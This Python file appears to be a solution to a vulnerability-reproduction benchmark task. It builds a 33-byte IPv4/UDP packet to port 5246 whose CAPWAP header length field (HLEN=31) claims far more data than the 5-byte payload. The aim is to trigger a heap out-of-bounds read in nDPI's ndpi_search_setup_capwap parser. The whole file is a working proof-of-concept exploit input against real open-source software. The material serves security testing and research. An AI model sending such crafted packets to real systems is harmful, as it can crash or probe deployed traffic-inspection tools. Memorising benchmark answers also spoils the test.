import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC for Heap Buffer Overflow in ndpi_search_setup_capwap.
        The vulnerability allows an out-of-bounds read when the CAPWAP header length field (HLEN)
        indicates a size larger than the actual packet payload.
        Ground-truth PoC length is 33 bytes (20 byte IP + 8 byte UDP + 5 byte payload).
        """
        
        # 1. IP Header (20 bytes)
        # IPv4, IHL=5 -> 0x45
        # Total Length = 33
        # Protocol = 17 (UDP)
        # Source/Dest = 127.0.0.1
        ip_ver_ihl = 0x45
        ip_tos = 0
        ip_total_len = 33
        ip_id = 0x1234
        ip_frag_off = 0
        ip_ttl = 64
        ip_proto = 17
        ip_check = 0
        ip_src = b'\x7f\x00\x00\x01'
        ip_dst = b'\x7f\x00\x00\x01'
        
        # Structure for IP header
        ip_fmt = '!BBHHHBBH4s4s'
        
        # Pack with zero checksum to calculate real checksum
        ip_header_tmp = struct.pack(
            ip_fmt, 
            ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_frag_off, 
            ip_ttl, ip_proto, ip_check, ip_src, ip_dst
        )
        
        # Calculate IP Checksum
        s = 0
        for i in range(0, len(ip_header_tmp), 2):
            w = (ip_header_tmp[i] << 8) + ip_header_tmp[i+1]
            s += w
            
        # Fold carry
        while (s >> 16):
            s = (s & 0xFFFF) + (s >> 16)
        ip_check = (~s) & 0xFFFF
        
        # Final IP Header
        ip_header = struct.pack(
            ip_fmt, 
            ip_ver_ihl, ip_tos, ip_total_len, ip_id, ip_frag_off, 
            ip_ttl, ip_proto, ip_check, ip_src, ip_dst
        )
        
        # 2. UDP Header (8 bytes)
        # Port 5246 is CAPWAP Control
        # Length = 8 (header) + 5 (payload) = 13
        udp_sport = 12345
        udp_dport = 5246 
        udp_len = 13
        udp_check = 0 # Optional in IPv4
        
        udp_header = struct.pack('!HHHH', udp_sport, udp_dport, udp_len, udp_check)
        
        # 3. Payload (5 bytes)
        # The vulnerability is in parsing CAPWAP header.
        # Format: [Preamble (8b)] [HLEN (5b) | ... ]
        # Setting HLEN to a large value (e.g., 31) implies a header size of 31*4 = 124 bytes.
        # Since actual payload is only 5 bytes, this triggers an OOB read.
        
        # Byte 0: Preamble = 0x00
        # Byte 1: 0xF8 => binary 11111000. Top 5 bits are 11111 (31).
        # Bytes 2-4: Padding
        payload = b'\x00\xf8\x00\x00\x00'
        
        return ip_header + udp_header + payload
